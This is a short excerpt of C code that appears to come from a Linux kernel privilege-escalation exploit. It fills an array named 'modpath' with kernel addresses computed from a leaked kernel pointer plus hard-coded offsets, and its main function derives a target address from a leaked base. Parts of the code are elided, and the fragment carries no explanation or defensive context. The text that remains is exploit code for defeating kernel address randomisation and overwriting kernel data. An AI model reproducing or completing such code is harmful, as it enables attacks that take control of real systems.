...
{
    modpath[33] = leak_ker + (0xffffffff82b3f5c8 - 0xffffffff812cd6f0);
    modpath[34] = leak_ker + (0xffffffff82b3f5c8 - 0xffffffff812cd6f0);
    modpath[38] = leak_ker + (0xffffffff82b3f5f0 - 0xffffffff812cd6f0);
    modpath[39] = leak_ker + (0xffffffff82b3f5f0 - 0xffffffff812cd6f0);

    modpath[44] = leak_ker + (0xffffffff826bdf56 - 0xffffffff812cd6f0);
    modpath[45] = leak_ker + (0xffffffff82b3f6a0 - 0xffffffff812cd6f0);
    modpath[48] = leak_ker - (0xffffffff812cd6f0 - 0xffffffff81132790);
    modpath[50] = leak_ker + (0xffffffff8220e3e0 - 0xffffffff812cd6f0);
    modpath[51] = leak_ker + (0xffffffff8220e3e4 - 0xffffffff812cd6f0);
}
...
int main()
{
    ...
    unsigned long modpath_addr = 0xffffffff82b3f4c0 - 0xffffffff812cd6f0 + single_start_addr;
